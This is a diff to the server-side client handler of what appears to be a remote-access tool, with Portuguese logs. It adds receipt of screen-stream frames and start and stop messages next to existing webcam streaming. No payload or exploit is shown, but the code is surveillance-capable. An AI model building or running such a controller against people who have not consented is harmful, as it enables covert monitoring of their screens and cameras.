@@ -95,6 +95,7 @@ class ClientHandler:
             self.update_pending = False
             self.last_ui_update = current_time
     def _process_binary_command(self, cmd):
+        logger.debug(f"Processando comando binário: {cmd}")
         if cmd == CMD_UPDATE:
             self._process_update_command()
         elif cmd == CMD_PING:
@@ -129,6 +130,12 @@ class ClientHandler:
             self._process_webcam_stream_start_response()
         elif cmd == CMD_WEBCAM_STREAM_STOP:
             self._process_webcam_stream_stop_response()
+        elif cmd == CMD_SCREEN_STREAM_START:
+            self._process_screen_stream_start_response()
+        elif cmd == CMD_SCREEN_STREAM_STOP:
+            self._process_screen_stream_stop_response()
+        elif cmd == CMD_SCREEN_STREAM_FRAME:
+            self._process_screen_stream_frame()
         else:
             if cmd > 100:  # Assumimos que comandos acima de 100 podem ser dados de arquivo
                 pass  # Silenciosamente ignorar
@@ -677,3 +684,79 @@ class ClientHandler:
                 self.log("Servidor não possui método para processar resposta de webcam")
         except Exception as e:
             self.log(f"Erro ao processar resposta de parada de streaming: {str(e)}")
+    def _process_screen_stream_frame(self):
+        try:
+            logger.debug(f"Recebendo frame de stream de tela do cliente {self.client_key}")
+            header_size_data = self._recv_exact(4)
+            if not header_size_data:
+                logger.error("Erro ao receber tamanho do cabeçalho de stream de tela")
+                return
+            header_size = struct.unpack('>I', header_size_data)[0]
+            if header_size <= 0 or header_size > 1024 * 1024:  # Limite de 1MB para o cabeçalho
+                logger.error(f"Tamanho do cabeçalho de stream de tela inválido: {header_size}")
+                return
+            header_data = self._recv_exact(header_size)
+            if not header_data:
+                logger.error("Erro ao receber cabeçalho de stream de tela")
+                return
+            try:
+                header = json.loads(header_data.decode('utf-8'))
+                quality = header.get('quality', 50)
+                logger.debug(f"Recebendo frame de stream de tela com qualidade {quality}%")
+            except:
+                logger.warning("Aviso: Não foi possível decodificar o cabeçalho de stream de tela")
+            img_size_data = self._recv_exact(4)
+            if not img_size_data:
+                logger.error("Erro ao receber tamanho da imagem de stream de tela")
+                return
+            img_size = struct.unpack('>I', img_size_data)[0]
+            if img_size <= 0 or img_size > 10 * 1024 * 1024:  # Limite de 10MB
+                logger.error(f"Tamanho da imagem de stream de tela inválido: {img_size}")
+                return
+            img_data = self._recv_exact(img_size, timeout=10)
+            if not img_data:
+                logger.error("Erro ao receber dados da imagem de stream de tela")
+                return
+            combined_data = header_size_data + header_data + img_size_data + img_data
+            if hasattr(self.server, 'process_screen_stream_frame'):
+                self.server.process_screen_stream_frame(self.client_address, combined_data)
+            else:
+                logger.warning("Servidor não possui método para processar frame de stream de tela")
+        except Exception as e:
+            logger.error(f"Erro ao processar frame de stream de tela: {str(e)}")
+    def _process_screen_stream_start_response(self):
+        logger.info(f"Recebendo resposta de início de streaming de tela do cliente {self.client_key}")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            logger.error("Erro ao receber tamanho da resposta de início de streaming")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        data = self._recv_exact(data_size)
+        if not data:
+            logger.error("Erro ao receber dados da resposta de início de streaming")
+            return
+        try:
+            if hasattr(self.server, 'process_screen_stream_response'):
+                self.server.process_screen_stream_response(self.client_address, CMD_SCREEN_STREAM_START, data)
+            else:
+                logger.warning("Servidor não possui método para processar resposta de streaming de tela")
+        except Exception as e:
+            logger.error(f"Erro ao processar resposta de início de streaming: {str(e)}")
+    def _process_screen_stream_stop_response(self):
+        logger.info(f"Recebendo resposta de parada de streaming de tela do cliente {self.client_key}")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            logger.error("Erro ao receber tamanho da resposta de parada de streaming")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        data = self._recv_exact(data_size)
+        if not data:
+            logger.error("Erro ao receber dados da resposta de parada de streaming")
+            return
+        try:
+            if hasattr(self.server, 'process_screen_stream_response'):
+                self.server.process_screen_stream_response(self.client_address, CMD_SCREEN_STREAM_STOP, data)
+            else:
+                logger.warning("Servidor não possui método para processar resposta de streaming de tela")
+        except Exception as e:
+            logger.error(f"Erro ao processar resposta de parada de streaming: {str(e)}")
